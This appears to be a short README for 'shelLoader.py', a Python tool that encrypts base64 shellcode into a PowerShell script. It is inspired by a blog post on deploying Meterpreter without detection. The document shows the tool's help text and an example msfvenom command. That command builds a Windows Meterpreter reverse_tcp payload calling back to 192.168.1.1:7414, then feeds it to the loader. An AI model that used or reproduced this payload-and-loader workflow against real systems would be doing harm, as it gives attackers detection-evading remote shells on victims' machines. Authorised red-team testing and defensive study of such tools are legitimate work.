A Python script inspired by the [Ghost-Shells](https://mrvar0x.com/2025/01/13/ghost-shells-deploying-meterpreter-without-detection/) from mrvar0x.com, designed to quickly generate PS1 scripts.

```
$ python3 shelLoader.py -h
   _____ _          _ _                     _            
  / ____| |        | | |                   | |          
 | (___ | |__   ___| | |     ___   __ _  __| | ___ _ __  
  \___ \| '_ \ / _ \ | |    / _ \ / _` |/ _` |/ _ \ '__|
  ____) | | | |  __/ | |___| (_) | (_| | (_| |  __/ |    
 |_____/|_| |_|\___|_|______\___/ \__,_|\__,_|\___|_| > By NulLD4y               
          
usage: shelLoader.py [-h] [-f FILE] [-s SHELLCODE] [-o OUTPUT]

Encrypt shellcode and generate PowerShell script

options:
  -h, --help            show this help message and exit
  -f, --file FILE       Input file containing base64 shellcode
  -s, --shellcode SHELLCODE
                        Base64 shellcode string
  -o, --output OUTPUT   Output PowerShell script file (default: rev.ps1)

example:

    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=7414 -f raw | base64 > b64rev
    $ python3 shelLoader.py -f b64rev
```
